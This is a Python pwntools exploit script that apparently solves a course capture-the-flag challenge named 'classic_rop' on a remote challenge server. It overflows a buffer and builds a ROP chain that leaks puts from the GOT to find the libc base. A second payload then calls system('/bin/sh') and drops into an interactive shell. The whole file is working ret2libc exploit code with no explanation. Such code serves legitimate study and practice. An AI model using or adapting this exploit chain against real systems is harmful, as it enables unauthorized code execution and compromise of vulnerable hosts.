from pwn import *

context.arch = 'amd64'
elf = ELF('./classic_rop', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

remote_conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1202)
remote_conn.recvuntil(b'Please input your NetID (something like abc123): ')
remote_conn.sendline(b'<NET ID>')
remote_conn.recvuntil(b"Let's ROP!\n")
remote_conn.sendline(b'1000')

buffer_overflow_offset = 40
pop_rdi_ret = 0x4011fe
ret_alignment = 0x4011ff

puts_plt_address = elf.plt['puts']
puts_got_address = elf.got['puts']
main_function_address = elf.symbols['main']
payload_leak = b'A' * buffer_overflow_offset
payload_leak += p64(pop_rdi_ret)
payload_leak += p64(puts_got_address)
payload_leak += p64(puts_plt_address)
payload_leak += p64(main_function_address)
remote_conn.sendline(payload_leak)
leaked_puts_bytes = remote_conn.recvn(6)
leaked_puts_bytes = leaked_puts_bytes.ljust(8, b'\x00')  # Pad to 8 bytes for unpacking
leaked_puts_address = u64(leaked_puts_bytes)


libc_base_address = leaked_puts_address - libc.symbols['puts']
system_function_address = libc_base_address + libc.symbols['system']
bin_sh_string_address = libc_base_address + next(libc.search(b'/bin/sh\x00'))

remote_conn.recvuntil(b"Let's ROP!\n")
remote_conn.sendline(b'1000')  # Send the large number again

# Craft the second payload to execute 'system("/bin/sh")'
payload_shell = b'A' * buffer_overflow_offset
payload_shell += p64(pop_rdi_ret)
payload_shell += p64(bin_sh_string_address)
payload_shell += p64(ret_alignment)
payload_shell += p64(system_function_address)

remote_conn.sendline(payload_shell)
remote_conn.interactive()
